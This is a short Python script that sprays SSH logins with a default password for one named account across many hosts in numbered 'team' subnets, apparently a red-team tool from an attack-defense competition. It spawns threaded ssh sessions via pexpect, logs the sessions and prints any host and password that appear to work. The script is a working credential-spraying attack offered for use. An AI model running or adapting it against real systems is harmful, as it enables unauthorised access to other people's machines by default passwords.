import pty
import sys
import asyncio
import pexpect
import threading

def ssh(user, host, password, timeout=2):
	try:                                                                                                                                                                                                                                                                                                         

		ssh_cmd = f'ssh {user}@{host}'                                                                                                              
		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")   
		child.log_file = open("list.log", "w")                                                                                                                         
		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
		child.sendline(password)                                                                                                                                                                                                                                                                                                     
		child.expect(pexpect.EOF)   
		print(f"User: {user}\tHost: {host}: Pwd: {password}")                                                                                                                                               
		child.close()
	except:
		return                                                                                                                                                                                                                                                                                                             


default_passwords = ["changeme123!"]


# each team
for team in range(1, 14):
	# each teams servers
	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
		# check each default password
		for password in default_passwords:
			x = threading.Thread(target=ssh, args=("Yuugo.Takagawa", f"10.{team}.1.{server}", password))
			x.start()
			y = threading.Thread(target=ssh, args=("Yuugo.Takagawa", f"172.16.{team}.{server}", password))
			y.start()






